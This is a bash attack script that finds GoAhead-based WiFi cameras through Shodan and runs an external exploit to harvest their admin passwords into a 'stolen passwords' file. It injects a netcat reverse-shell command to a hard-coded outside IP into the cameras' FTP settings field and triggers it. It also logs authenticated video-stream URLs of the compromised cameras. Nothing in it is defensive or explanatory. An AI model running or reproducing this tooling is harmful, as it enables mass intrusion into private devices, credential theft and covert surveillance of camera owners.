#wificam.sh
# usage : ./wificam1.sh 100 |grep 'loginuse=admin'
#!/bin/bash
#Colors functions

shw_grey () {
    echo $(tput bold)$(tput setaf 0) $@ $(tput sgr 0)
}

shw_norm () {
    echo $(tput bold)$(tput setaf 9) $@ $(tput sgr 0)
}
shw_norm1 () {
    echo $(tput bold)$(tput setaf 7) $@ $(tput sgr 0)
}

shw_info () {
    echo $(tput bold)$(tput setaf 4) $@ $(tput sgr 0)
}

shw_warn () {
    echo $(tput bold)$(tput setaf 2) $@ $(tput sgr 0)
}
shw_err ()  {
    echo $(tput bold)$(tput setaf 1) $@ $(tput sgr 0)
}

function HTTPCode(){
	
	Code=$(curl -o /dev/null --max-time 4 --silent --head --write-out '%{http_code}' $(echo $1) ) 

	if [ $Code -eq 200 ]; then
		shw_warn "Server Up!(Response $Code)" $1
		shw_norm1 $1
	elif [ $Code -eq 401 ]; then
		shw_warn "Server Up!(Response $Code)" $1
		shw_norm $1 
	else
		shw_err $1 "Down!"	 	
	fi
}

function Stash(){
	input=$1
	stash=$2
echo $input
echo $stash
	if [[ $3 -eq 1 ]]; then
	

		echo $input >> $lootfolder'sortingbox.lst' 
		cat $lootfolder'sortingbox.lst' |sort -u >> $lootfolder'sortingbox_stash.lst'
		#:>$lootfolder'sortingbox.lst'
	else

		#cat $input >> $lootfolder'sortingbox.lst' 
		cat $lootfolder'sortingbox.lst'  |sort -u >> $lootfolder'sortingbox_stash.lst'
		#:>$lootfolder'sortingbox.lst'
	fi
	#cat $lootfolder'sortingbox.lst'
		
		cat $lootfolder'sortingbox_stash.lst' > "$stash"
		:> $lootfolder'sortingbox_stash.lst'


}
function curlshit(){
	#1 	ip
	#2	port
	#3	user
	#4	pass
	echo $1":"$2 $3 $4
 	echo 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0'  
	curl 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0' --max-time 10  > /dev/null

	Trigger='http://'$3':'$4'@'$1':'$2'/ftptest.cgi?next_url=test_ftp.htm&loginuse='$3'&loginpas='$4 
	echo "$Trigger" >>  $lootfolder'camtriggers.lst'
	echo "$Trigger" 
	#Stash $lootfolder'camtriggers.lst' $lootfolder'camtriggers_stash.lst' 0
	echo 'http://'$3':'$4'@'$1':'$2'/videostream.cgi?loginuse='$3'&loginpas='$4 >> $lootfolder'camstreams.lst'
	#Stash 'http://'$3':'$4'@'$1':'$2'/videostream.cgi?loginuse='$3'&loginpas='$4 $lootfolder'camstreams_stash.lst' 
	echo $(echo  'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%20666%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0') >> $lootfolder'strip.lst' 

}
#set env vars
lootfolder='/root/.wifiscan_results'
mkdir -p $lootfolder
lootfolder=$(echo $lootfolder'/')
shodan search 'GoAhead 5ccc069c403ebaf9f0171e9517f40e41' --fields ip_str,port --separator ':'  |awk -F ':' '{print $1":"$2}' > $lootfolder'tmp.lst'
#cat $lootfolder'tmp.lst' >> $lootfolder'wificam_LOOT.lst'//
#Stash $lootfolder'tmp.lst' $lootfolder'target_stash.lst' 0
cat $lootfolder'target_stash.lst'
#cat   $lootfolder'tmp.lst'
#cat $lootfolder'tmp.lst' 

if [[ $2 -eq 1 ]]; then
	#get passwords
#	i=1

	#for ts in $(cat $lootfolder'tmp.lst' |shuf |tail -n $1 ); do
		
		python3 /root/stuff/tools/expcamera/exploit_camera.py -b 2 -l $lootfolder'tmp.lst' -v -o $lootfolder'wificam_LOOT.lst' && shw_err $i
		cat $lootfolder'wificam_LOOT.lst' |sort -u |shuf >> $lootfolder'backup_LOOT.lst'

	#	let "i++"	
#	done
#clear buffers
:> $lootfolder'wificam_LOOT.lst' 
:> $lootfolder'tmp.lst'


	#curl the netcat payload into the FTP host field
	for i in $(cat $lootfolder'backup_LOOT.lst' |sort -u |grep -w 'password'|tail -n -1 ); do
		#filterout needs
		IP=$(echo $i |awk -F ',' '{print $1}'|awk -F ':' '{print $2}' )
		PORT=$(echo $i |awk -F ',' '{print $2}'|awk -F ':' '{print $2}' )
		NAME_PASS=$(echo $i |awk -F ',' '{print $3}'|awk -F ':' '{print $2}' )
		
		#add the pass to the stash
		echo $NAME_PASS >> $lootfolder'STOLEN_PASS_2018.lst'

		if [[ $3 -eq 1 ]]; then
			if [[ $IP ]]; then
				echo "HacKinG fTp BaCkDoOr: "$IP":"$PORT":admin:"$NAME_PASS;
				curlshit $IP $PORT "admin" $NAME_PASS '666'
			fi
		fi

	done
fi

#wc -l  $lootfolder'STOLEN_PASS_2018.lst'
if [[ $4 -eq 1 ]]; then

	#cat $lootfolder'camstreams.lst' |sort -u 
	
	for i in $(cat  $lootfolder'wificam_old_LOOT.lst'  |shuf |grep recheck |awk '{print $12}'|grep recheck |head -n -1); do 
		cat '/root/stuff/tools/expcamera/RECHECK/'$i |awk '/@gmail/ {for(i=1; i<=9; i++) {getline; print}}'; 
		echo "#####################" ; 
	done
fi

shw_err "--------------------------------------"
cat $lootfolder'camtriggers.lst' |sort -u 
shw_err "--------------------------------------"

shw_err " stolen passwords"
wc -l  $lootfolder'STOLEN_PASS_2018.lst' && wc -l  $lootfolder'STOLEN_PASS_2018.lst' |awk -F ' ' '{print $1}'

shw_err "clean?(1/0)"

read clean

if [[ $clean -eq 1 ]]; then
	# shw_err "CLEAN UP CREW WORKING.......";
	# for i in $(cat $lootfolder'wificam_LOOT.lst' |sort -u |grep -w 'password'|tail -n $1 ); do 
	# 	IP=$(echo $i |awk -F ',' '{print $1}'|awk -F ':' '{print $2}' )
	# 	PORT=$(echo $i |awk -F ',' '{print $2}'|awk -F ':' '{print $2}' )
	# 	curl $IP':'$PORT --max-time 4 > /dev/null; 
	# done 
	#:>$lootfolder'strip.lst';
	#:>$lootfolder'camtriggers.lst';
	#cat $lootfolder'wificam_UP_LOOT.lst' >>  $lootfolder'wificam_old_LOOT.lst'
	cat $lootfolder'wificam_LOOT.lst' >>  $lootfolder'wificam_old_LOOT.lst'
	#:>$lootfolder'wificam_LOOT.lst';
	#:>$lootfolder'wificam_UP_LOOT.lst';


fi
